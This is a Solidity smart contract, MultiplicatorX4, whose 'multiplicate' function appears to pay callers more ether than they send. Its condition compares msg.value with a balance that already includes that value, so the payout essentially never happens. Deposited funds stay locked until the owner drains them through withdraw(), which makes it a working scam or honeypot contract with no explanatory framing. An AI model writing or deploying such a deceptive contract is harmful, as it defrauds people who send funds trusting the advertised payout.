pragma solidity ^0.4.18;

contract MultiplicatorX4 {
    address public owner;

    function MultiplicatorX4() public {
        owner = msg.sender;
    }

    function() public payable {}

    function withdraw() public payable {
        require(msg.sender == owner);
        owner.transfer(this.balance);
    }

    function command(address adr, bytes data) public payable {
        require(msg.sender == owner);
        require(adr.call.value(msg.value)(data));
    }

    function multiplicate(address adr) public payable {
        require(msg.value > 0);
        if (msg.value >= this.balance) {
            adr.transfer(this.balance + msg.value);
        }
    }
}